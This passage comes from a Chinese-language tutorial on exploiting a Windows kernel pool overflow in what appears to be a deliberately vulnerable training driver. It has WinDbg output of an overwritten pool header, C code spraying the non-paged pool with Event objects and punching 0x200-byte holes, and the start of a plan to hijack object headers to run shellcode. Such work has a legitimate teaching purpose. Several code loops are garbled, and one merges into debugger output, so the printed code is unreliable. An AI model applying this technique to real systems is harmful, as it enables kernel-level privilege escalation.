    UserModeBufferSize = 512 + 8;
如果UserModeBuffer空间大于ExAllocatePoolWithTag所申请的空间，
在执行RtlCopyMemory(KernelBuffer, UserBuffer, Size);
时就会覆盖下一个pool chunk的相关信息
下一个chunk被覆盖前后的数据（由于重新运行了程序，所有地址和上面不一样了）
    kd> dd 8818d610
    8818d610  085f0040 70627375 88335fb8 00000000
    8818d620  00000000 00000000 00000000 00000000
    8818d630  43787254 00000000 00000000 000000c8
    8818d640  077415ad 00000000 00000000 0000020a
    8818d650  0000000f 000002f0 000002cc 00000003
    8818d660  00000001 00000000 6f6d7455 86378028
    8818d670  00000000 00000000 00000000 00000000
    8818d680  00000000 00000000 00000000 00000000
    kd> dt nt!_POOL_HEADER  8818d610
       +0x000 PreviousSize     : 0y001000000 (0x40)
       +0x000 PoolIndex        : 0y0000000 (0)
       +0x002 BlockSize        : 0y001011111 (0x5f)
       +0x002 PoolType         : 0y0000100 (0x4)
       +0x000 Ulong1           : 0x85f0040
       +0x004 PoolTag          : 0x70627375
       +0x004 AllocatorBackTraceIndex : 0x7375
       +0x006 PoolTagHash      : 0x706
覆盖后
    kd> dt nt!_POOL_HEADER  8818d610
       +0x000 PreviousSize     : 0y101000001 (0x141)
       +0x000 PoolIndex        : 0y0100000 (0x20)
       +0x002 BlockSize        : 0y101000001 (0x141)
       +0x002 PoolType         : 0y0100000 (0x20)
       +0x000 Ulong1           : 0x41414141
       +0x004 PoolTag          : 0x41414141
       +0x004 AllocatorBackTraceIndex : 0x4141
       +0x006 PoolTagHash      : 0x4141
    kd> dd 8818d610
    8818d610  41414141 41414141 42424242 42424242
    8818d620  00000000 00000000 00000000 00000000
    8818d630  43787254 00000000 00000000 000000c8
    8818d640  077415ad 00000000 00000000 0000020a
    8818d650  0000000f 000002f0 000002cc 00000003
    8818d660  00000001 00000000 6f6d7455 86378028
    8818d670  00000000 00000000 00000000 00000000
    8818d680  00000000 00000000 00000000 00000000
再继续运行的话，系统蓝屏
## 漏洞利用
内核池类似于windows中的堆，用来动态分配内存，因为有漏洞的用户缓冲区分配在非分页池上，所以我们需要一些技术来控制修改非分页池。这种技术就是堆喷技术，如果之前你没接触内核堆喷，没关系，往下看就行了。
Windows 提供了一种[Event](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682655\(v=vs.85\).aspx)对象,
该对象存储在非分页池中，可以使用[CreateEvent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682396\(v=vs.85\).aspx) API 来创建：
    HANDLE WINAPI CreateEvent(
      _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes,
      _In_     BOOL                  bManualReset,
      _In_     BOOL                  bInitialState,
      _In_opt_ LPCTSTR               lpName
    );
在这里我们需要用这个API创建两个足够大的Event对象数组，然后通过使用[CloseHandle](https://bbs.pediy.com/closehandle)
API 释放某些Event 对象，从而在分配的池块中造成空隙，经合并形成更大的空闲块:
    BOOL WINAPI CloseHandle(
      _In_ HANDLE hObject
    );
下面我们具体跟踪观察下，就明白了。
        //heap spray
        HANDLE spray_event1[10000] = { NULL };
        HANDLE spray_event2[5000] = { NULL };
        for (int i = 0; i = 4989; i--)
        {
            printf("%x\n", spray_event2[i]);
    }
如上构造堆喷代码，最后把后面的事件句柄打印出来，方便我们观察池结构。
    kd> !handle eafc
    PROCESS 85a54030  SessionId: 1  Cid: 0a0c    Peb: 7ffdf000  ParentCid: 05e8
        DirBase: bebcd580  ObjectTable: a6088008  HandleCount: 15010.
        Image: MyExploitForHevd.exe
    Handle table at a6088008 with 15010 entries in use
    eafc: Object: 85b33930  GrantedAccess: 001f0003 Entry: a5ada5f8
    Object: 85b33930  Type: (85763418) Event
        ObjectHeader: 85b33918 (new version)
            HandleCount: 1  PointerCount: 1
    kd> !pool 85b33930
    Pool page 85b33930 region is Nonpaged pool
     85b33000 size:   40 previous size:    0  (Allocated)  Even (Protected)
     85b33040 size:  290 previous size:   40  (Free)       ...@
     85b332d0 size:   40 previous size:  290  (Allocated)  SeTl
     85b33310 size:  2f8 previous size:   40  (Allocated)  usbp
     85b33608 size:  2f8 previous size:  2f8  (Allocated)  usbp
    *85b33900 size:   40 previous size:  2f8  (Allocated) *Even (Protected)
         Pooltag Even : Event objects
     85b33940 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33980 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b339c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33a00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33a40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33a80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33ac0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33b00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33b40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33b80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33bc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33c00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33c40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33c80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33cc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33d00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33d40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33d80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33dc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33e00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33e40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33e80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33ec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33f00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33f40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33f80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b33fc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
如上观察，Even占据着大量的pool page，每个大小0x40。
我们申请的池大小为504，再加上8个字节的pool header， 504+8=512=0x200=0x40*8, 刚好8个event
chunk的大小，这也是我们选择event内核对象的原因。
下面我们看看如何制造堆喷缝隙：
        //制造堆喷区空洞, 目的使我们的数据分配到空洞上;
        for (int i = 0; i  !pool 85b32d70
    Pool page 85b32d70 region is Nonpaged pool
     85b32000 size:  2f8 previous size:    0  (Allocated)  usbp
     85b322f8 size:  510 previous size:  2f8  (Free)       ."..
     85b32808 size:  2f8 previous size:  510  (Allocated)  usbp
     85b32b00 size:   40 previous size:  2f8  (Free )  Even (Protected)
     85b32b40 size:   40 previous size:   40  (Free )  Even (Protected)
     85b32b80 size:   40 previous size:   40  (Free )  Even (Protected)
     85b32bc0 size:   40 previous size:   40  (Free )  Even (Protected)
     85b32c00 size:   40 previous size:   40  (Free )  Even (Protected)
     85b32c40 size:   40 previous size:   40  (Free )  Even (Protected)
     85b32c80 size:   40 previous size:   40  (Free )  Even (Protected)
     85b32cc0 size:   40 previous size:   40  (Free)       Even
     85b32d00 size:   40 previous size:   40  (Allocated)  Even (Protected)
    *85b32d40 size:   40 previous size:   40  (Allocated) *Even (Protected)
         Pooltag Even : Event objects
     85b32d80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b32dc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b32e00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b32e40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b32e80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b32ec0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b32f00 size:  100 previous size:   40  (Free)       Even
如上所示，在我们调用CloseHandle关闭大量事件句柄后，内核池页上出现了大量的空洞。大小为0x40*8=0x200,当我们再次申请0x200大小的空间时，就有很大的概率落在这些空洞上。
此次申请的KernelBuffer = 0x85b108c8，我们看下其位置
    kd> !pool 0x85b108c8
    Pool page 85b108c8 region is Nonpaged pool
     85b10000 size:   40 previous size:    0  (Allocated)  Even (Protected)
     85b10040 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10080 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b100c0 size:  200 previous size:   40  (Free)       Even（8个一组的缝隙）
     85b102c0 size:   40 previous size:  200  (Allocated)  Even (Protected)
     85b10300 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10340 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10380 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b103c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10400 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10440 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10480 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b104c0 size:  200 previous size:   40  (Free)       Even（8个一组的缝隙）
     85b106c0 size:   40 previous size:  200  (Allocated)  Even (Protected)
     85b10700 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10740 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10780 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b107c0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10800 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10840 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10880 size:   40 previous size:   40  (Allocated)  Even (Protected)
    *85b108c0 size:  200 previous size:   40  (Allocated) *Hack
            Owning component : Unknown (update pooltag.txt)
     85b10ac0 size:   40 previous size:  200  (Allocated)  Even (Protected)
     85b10b00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10b40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10b80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10bc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10c00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10c40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10c80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10cc0 size:   c0 previous size:   40  (Free)       Even
     85b10d80 size:  140 previous size:   c0  (Allocated)  Io   Process: 873d9478
     85b10ec0 size:   40 previous size:  140  (Allocated)  Even (Protected)
     85b10f00 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10f40 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10f80 size:   40 previous size:   40  (Allocated)  Even (Protected)
     85b10fc0 size:   40 previous size:   40  (Allocated)  Even (Protected)
可知其刚好落在了构造的堆喷空隙中。
所以我们向下覆盖数据时，会覆盖event对象的一些结构，我们接下来看下如果通过event对象来达到控制程序流程，执行我们的shellcode。
Windows系统的各种资源以对象（Object）的形式来组织，例如File Object, Driver Object, Device
Object等等，但实际上这些所谓的“对象”在系统的对象管理器（Object Manager）看来只是完整对象的一个部分——对象实体（Object
Body）
一个内核对象有三部分组成，
首先是
    kd> dt nt!_OBJECT_HEADER_QUOTA_INFO
       +0x000 PagedPoolCharge  : Uint4B
       +0x004 NonPagedPoolCharge : Uint4B
       +0x008 SecurityDescriptorCharge : Uint4B
       +0x00c SecurityDescriptorQuotaBlock : Ptr32 Void
一个对象可以包含全部四个结构，也可能只包含其中的某个。
之后是OBJECT_HEADER结构，
    kd> dt nt!_OBJECT_HEADER
       +0x000 PointerCount     : Int4B
       +0x004 HandleCount      : Int4B
       +0x004 NextToFree       : Ptr32 Void
       +0x008 Lock             : _EX_PUSH_LOCK
       +0x00c TypeIndex        : UChar